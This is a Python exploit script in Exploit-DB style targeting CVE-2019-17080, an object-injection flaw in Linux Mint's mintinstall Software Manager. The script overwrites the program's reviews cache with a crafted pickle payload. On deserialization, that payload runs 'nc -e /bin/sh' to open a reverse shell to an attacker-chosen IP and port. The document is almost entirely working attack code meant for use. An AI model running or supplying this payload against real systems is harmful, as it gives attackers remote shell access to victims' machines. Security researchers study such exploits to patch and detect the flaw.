# Exploit Title: mintinstall (aka Software Manager) object injection
# Date: 10/02/2019
# Exploit Author: Andhrimnirr
# Vendor Homepage: https://www.linuxmint.com/
# Software Link: mintinstall (aka Software Manager)
# Version: 7.9.9
# Tested on: Linux Mint
# CVE : CVE-2019-17080


import os
import sys
def shellCode(payload):
    with open(f"{os.getenv('HOME')}/.cache/mintinstall/reviews.cache","w") as wb:
        wb.write(payload)
    print("[+] Start mintinstall")
if __name__=="__main__":
    shellCode(f"""cos\nsystem\n(S"nc -e /bin/sh {sys.argv[1]} {sys.argv[2]}"\ntR.""")
else:
    print("[!] exploit.py [IP] [PORT]")